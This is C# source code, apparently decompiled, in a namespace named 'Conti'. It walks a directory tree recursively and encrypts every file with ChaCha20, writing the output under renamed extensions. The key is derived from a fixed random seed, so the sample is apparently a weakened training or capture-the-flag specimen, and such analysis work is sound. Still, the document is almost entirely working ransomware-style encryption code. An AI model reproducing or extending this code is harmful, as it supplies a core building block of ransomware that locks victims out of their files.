using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;

namespace Conti
{
    // Token: 0x02000005 RID: 5
    //[NullableContext(1)]
    //[Nullable(0)]
    internal class Program
    {
        // Token: 0x06000005 RID: 5 RVA: 0x00001EB8 File Offset: 0x000010B8
        private static void FileEnumeration(string dir, List<FileInfo> files)
        {
            foreach (string text in Directory.GetFiles(dir, "*.*", 0))
            {
                files.Add(new FileInfo(text));
            }
            foreach (string dir2 in Directory.GetDirectories(dir))
            {
                try
                {
                    Program.FileEnumeration(dir2, files);
                }
                catch (UnauthorizedAccessException)
                {
                }
            }
        }

        // Token: 0x06000006 RID: 6 RVA: 0x00001F28 File Offset: 0x00001128
        private static void Encrypt(string filename)
        {
            Random random = new Random(1337);
            byte[] array = new byte[32];
            byte[] array2 = new byte[12];
            random.NextBytes(array);
            random.NextBytes(array2);
            byte[] array3 = File.ReadAllBytes(filename);
            byte[] array4 = new byte[array3.Length];
            ChaCha7539Engine chaCha7539Engine = new ChaCha7539Engine();
            chaCha7539Engine.Init(true, new ParametersWithIV(new KeyParameter(array), array2));
            chaCha7539Engine.ProcessBytes(array3, 0, array3.Length, array4, 0);
            string text = Path.GetDirectoryName(filename) + "\\encrypted\\";
            if (!Directory.Exists(text))
            {
                Directory.CreateDirectory(text);
            }
            File.WriteAllBytes(text + Path.GetFileName(filename).Replace(Path.GetExtension(filename), ".EXTEN"), array4);
        }

        // Token: 0x06000007 RID: 7 RVA: 0x00001FD8 File Offset: 0x000011D8
        private static void Main()
        {
            List<FileInfo> list = new List<FileInfo>();
            Program.FileEnumeration("encryptThese", list);
            foreach (FileInfo fileInfo in list)
            {
                Encrypt(fileInfo.FullName);
            }
        }

        // Token: 0x06000008 RID: 8 RVA: 0x00002040 File Offset: 0x00001240
        public Program()
        {
        }
    }
}
